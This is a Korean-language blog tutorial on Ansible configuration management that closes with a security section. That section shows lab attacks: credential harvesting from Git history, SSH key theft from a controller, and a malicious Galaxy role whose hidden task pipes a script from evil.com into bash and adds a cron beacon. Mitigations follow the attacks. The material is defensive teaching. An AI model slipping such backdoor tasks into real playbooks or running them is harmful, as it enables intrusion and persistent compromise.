---
layout: post
title: "Ansible"
date: 2025-12-10 17:00:00 +0900
categories: [iac]
---

## 1. 개요

**Ansible**은 여러 대의 서버를 효율적으로 관리하고 구성을 자동화하는 대표적인 **IaC (Infrastructure as Code)** 도구이다.
Python으로 개발되었으며, 관리 대상 서버에 별도의 에이전트(Agent)를 설치할 필요 없이 **SSH** 프로토콜만 있으면 즉시 사용 가능한 것이 가장 큰 장점이다.

### 특징
*   **Agentless**: SSH를 통해 통신하므로 대상 서버에 데몬을 띄울 필요가 없다.
*   **멱등성 (Idempotency)**: 동일한 작업을 여러 번 수행해도 결과가 항상 같음을 보장한다. (예: 이미 설치된 패키지는 재설치하지 않고 넘어감)
*   **YAML 기반**: Playbook을 YAML 포맷으로 작성하여 가독성이 뛰어나다.

### Terraform vs Ansible
| 구분 | Ansible | Terraform |
|------|---------|-----------|
| **주 목적** | **구성 관리 (Configuration)** | **프로비저닝 (Provisioning)** |
| **적용 대상** | 패키지 설치, 파일 수정, 서비스 재시작 | VPC 생성, VM 프로비저닝, DB 생성 |
| **방식** | Push 방식 (Controller → Node) | 선언적 상태 정의 |

---

## 2. 초기 환경 설정

Ansible은 도메인 이름이나 IP로 통신하므로, `/etc/hosts` 설정과 SSH 키 배포가 선행되어야 한다.

### 1. 호스트네임 및 Hosts 파일 설정
실습 환경의 통신 편의를 위해 각 노드의 이름을 등록한다.
```bash
# /etc/hosts (모든 노드 공통)
10.0.0.11   cont    # Control Node
10.0.0.12   node1   # Managed Node 1
10.0.0.13   node2   # Managed Node 2
10.0.0.14   node3   # Managed Node 3
```

### 2. 설치 (Control Node)
Rocky Linux / CentOS 환경에서의 설치 방법이다.
```bash
dnf install -y epel-release
dnf install -y ansible
ansible --version
```

### 3. 인벤토리 작성 (/etc/ansible/hosts)
관리할 서버들의 목록과 그룹을 정의한다.
```ini
[webservers]
node1
node2

[dbservers]
node3

[all:vars]
ansible_user=root
ansible_password=It1
```
> **보안 주의**: 비밀번호를 평문으로 저장하는 대신 SSH 키 기반 인증을 사용하는 것이 권장된다.

---

## 3. Ad-Hoc 명령어 활용

Playbook 작성 없이 한 줄의 명령어로 작업을 수행한다. 간단한 상태 확인이나 일회성 작업에 유용하다.

### 연결 확인 (Ping)
```bash
ansible all -m ping
```

### 쉘 명령어 실행
```bash
# 모든 웹 서버의 가동 시간(uptime) 확인
ansible webservers -m shell -a "uptime"
```

### 파일 및 사용자 관리 모듈
```bash
# 디렉토리 생성
ansible all -m file -a "path=/tmp/test_dir state=directory"

# 사용자 생성 (비밀번호는 해시 처리 필요)
ansible node1 -m user -a "name=deployer password={{ 'It1' | password_hash('sha512') }}"

# 특정 파일 내 문자열 수정 (lineinfile)
ansible all -m lineinfile -a "path=/etc/ssh/sshd_config regexp='^PermitRootLogin' line='PermitRootLogin no'"
```

---

## 4. Playbook 기본 구조

복잡한 작업은 Playbook(YAML)으로 정의하여 재사용한다.

```yaml
# apache_install.yml
---
- name: 웹 서버 구성
  hosts: webservers
  become: yes  # root 권한 상승

  tasks:
    - name: Apache 패키지 설치
      yum:
        name: httpd
        state: present

    - name: 기본 인덱스 파일 생성
      copy:
        content: "<h1>Hello Ansible</h1>"
        dest: /var/www/html/index.html

    - name: 서비스 시작 및 부팅 시 활성화
      service:
        name: httpd
        state: started
        enabled: yes
```

### 실행 및 디버깅
```bash
# 구문 검사
ansible-playbook apache_install.yml --syntax-check

# 드라이 런 (변경 사항 미리보기)
ansible-playbook apache_install.yml --check

# 실제 실행
ansible-playbook apache_install.yml
```

---

## 5. 고급 기능: 변수와 핸들러

### 변수 활용 (Variables)
작업의 유연성을 위해 변수를 사용한다. `vars` 키워드를 쓰거나 실행 시 `-e` 옵션으로 주입할 수 있다.
```yaml
vars:
  http_port: 8080
  
tasks:
  - name: 포트 설정 변경
    lineinfile:
      path: /etc/httpd/conf/httpd.conf
      regexp: '^Listen'
      line: "Listen {{ http_port }}"
```

### 핸들러 (Handlers)
특정 작업이 변경되었을 때만(Change 발생 시) 실행되는 특별한 태스크이다. 설정 변경 후 서비스 재시작 시 주로 사용된다.
```yaml
  tasks:
    - name: 설정 파일 변경
      template:
        src: httpd.conf.j2
        dest: /etc/httpd/conf/httpd.conf
      notify: Restart Apache  # 변경 시 핸들러 호출

  handlers:
    - name: Restart Apache
      service:
        name: httpd
        state: restarted
```

---

## 6. 실습: WordPress 3-Tier 배포

Nginx(Web), Apache/PHP(App), MariaDB(DB)로 구성된 3계층 아키텍처를 자동으로 구축한다.

### Role 구조 활용
대규모 프로젝트는 `roles` 디렉토리를 사용하여 구조화한다.
```text
playbook.yml
roles/
  ├── web/ (Nginx)
  ├── app/ (PHP + WordPress)
  └── db/  (MariaDB)
```

### Playbook 예시 (site.yml)
```yaml
---
- hosts: web
  roles:
    - web

- hosts: app
  roles:
    - app

- hosts: db
  roles:
    - db
```
각 Role 내부에는 `tasks/main.yml`, `handlers/main.yml`, `templates/` 등이 존재하여 각 계층의 설치와 설정을 독립적으로 관리한다. 이 방식을 통해 코드의 재사용성과 유지보수성을 극대화할 수 있다.

---

## 7. 보안 고려사항

인벤토리 파일이나 Playbook에 **비밀번호를 평문으로 저장하면 Git 커밋 시 노출**될 위험이 있다.

### 7.1. 공격 시연 (Lab 환경)

#### 공격 1: 인벤토리 파일에서 자격 증명 탈취

Git 저장소에 커밋된 인벤토리 파일에서 평문 비밀번호를 추출하는 시나리오이다.

**[취약한 환경]**
*   인벤토리에 `ansible_password` 평문 저장
*   Git History에 비밀번호 잔류

**[공격 과정]**
```bash
# 1. Git 저장소 클론
git clone https://github.com/victim/ansible-playbooks.git

# 2. 인벤토리 파일에서 비밀번호 검색
grep -r "ansible_password\|ansible_ssh_pass" .
# 출력: [all:vars]
#       ansible_password=It1

# 3. Git History에서 삭제된 비밀번호도 검색
git log -p --all | grep -i "password"
# 이전에 커밋된 비밀번호도 모두 노출

# 4. 탈취한 자격 증명으로 서버 접속
ssh root@node1  # 비밀번호: It1
```

**[공격 결과]**: Git 저장소 접근 → 서버 자격 증명 탈취 → 인프라 장악 🔓

---

#### 공격 2: 악성 Ansible Galaxy Role 공급망 공격

공격자가 악성 Role을 Ansible Galaxy에 업로드하여, 피해자가 설치 시 백도어가 설치되는 시나리오이다.

**[취약한 환경]**
*   출처 불명의 Galaxy Role 무분별하게 사용
*   Role 코드 검토 없이 설치

**[공격 과정]**
```bash
# 피해자가 악성 Role 설치
ansible-galaxy install evil-hacker.nginx-backdoor
```

```yaml
# 악성 Role 내부 (tasks/main.yml)
- name: Install nginx
  yum:
    name: nginx
    state: present

- name: Install backdoor (숨겨진 태스크)
  shell: |
    curl https://evil.com/shell.sh | bash
    echo "* * * * * root curl https://evil.com/beacon | bash" >> /etc/crontab
```

**[공격 결과]**: 악성 Role 사용 → 전체 관리 서버 백도어 설치 🔓

---

#### 공격 3: Ansible Controller 장악 시 전체 인프라 장악

Ansible Controller(Control Node)가 침해되면, 관리되는 모든 서버에 접근할 수 있다.

**[취약한 환경]**
*   Controller에 SSH 개인키가 `~/.ssh/` 에 저장
*   Controller 서버가 외부에 노출

**[공격 과정]**
```bash
# 1. 공격자가 Controller 서버 침투 (취약점 이용)
ssh attacker@controller

# 2. SSH 키 탈취
cat ~/.ssh/id_rsa

# 3. 인벤토리에서 관리 대상 서버 목록 확인
cat /etc/ansible/hosts

# 4. 모든 관리 대상 서버에 접근
ssh -i ~/.ssh/id_rsa root@node1
ssh -i ~/.ssh/id_rsa root@node2
# 전체 인프라 장악
```

**[공격 결과]**: Controller 침투 → SSH 키 탈취 → 전체 관리 서버 장악 🔓

---

### 7.2. 방어 대책

| 공격 | 방어 |
|:---|:---|
| 인벤토리 자격 증명 탈취 | 방어 1, 2 |
| 공급망 공격 | 방어 3 |
| Controller 장악 | 방어 4, 5 |

---

#### 방어 1: Ansible Vault 사용 (필수)

민감한 정보를 암호화하여 저장한다.

```bash
# 암호화된 변수 파일 생성
ansible-vault create secrets.yml
```

```yaml
# secrets.yml (암호화되어 저장됨)
db_password: "S3cr3tP@ss!"
api_key: "xxxx-yyyy-zzzz"
```

```yaml
# playbook.yml에서 사용
vars_files:
  - secrets.yml

tasks:
  - name: DB 설정
    template:
      src: db.conf.j2
      dest: /etc/myapp/db.conf
    # {{ db_password }} 변수 사용
```

```bash
# 실행 시 Vault 비밀번호 입력
ansible-playbook site.yml --ask-vault-pass

# CI/CD용: 파일에서 비밀번호 읽기
ansible-playbook site.yml --vault-password-file ~/.vault_pass
```

---

#### 방어 2: SSH 키 기반 인증

비밀번호 대신 SSH 키를 사용하고, 키 파일 권한을 제한한다.

```bash
# SSH 키 생성 및 배포
ssh-keygen -t ed25519 -C "ansible@controller"
ssh-copy-id root@node1

# 키 파일 권한 설정 (필수)
chmod 600 ~/.ssh/id_ed25519
```

```ini
# 인벤토리에서 비밀번호 제거
[all:vars]
ansible_user=root
ansible_ssh_private_key_file=~/.ssh/id_ed25519
# ansible_password 사용 금지
```

---

#### 방어 3: Galaxy Role 검증

신뢰할 수 있는 소스의 Role만 사용하고, 설치 전 코드를 검토한다.

```bash
# 공식/검증된 Role만 사용
ansible-galaxy install geerlingguy.nginx  # 유명 개발자

# 설치 전 코드 검토
ansible-galaxy download geerlingguy.nginx
cat geerlingguy.nginx/tasks/main.yml

# requirements.yml로 버전 고정
# requirements.yml
- name: geerlingguy.nginx
  version: 3.1.4  # 정확한 버전 고정
```

---

#### 방어 4: Controller 서버 보안 강화

Controller는 Bastion Host처럼 보안을 강화해야 한다.

```bash
# 방화벽: SSH만 허용, 내부 네트워크에서만 접근
firewall-cmd --add-rich-rule='rule family="ipv4" source address="10.0.0.0/24" service name="ssh" accept'
firewall-cmd --set-default-zone=drop

# SSH 보안 강화
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
AllowUsers ansible
```

---

#### 방어 5: 최소 권한 원칙

Ansible 사용자에게 `root` 대신 필요한 최소 권한만 부여한다.

```bash
# 관리 대상 서버에 전용 사용자 생성
useradd ansible
echo "ansible ALL=(ALL) NOPASSWD: /usr/bin/yum, /bin/systemctl" >> /etc/sudoers.d/ansible
```

```ini
# 인벤토리 설정
[all:vars]
ansible_user=ansible
ansible_become=yes
ansible_become_method=sudo
```

> **Tip**: **AWX/Ansible Tower**를 사용하면 자격 증명을 중앙에서 안전하게 관리하고, RBAC로 접근을 제어할 수 있다.

<hr class="short-rule">
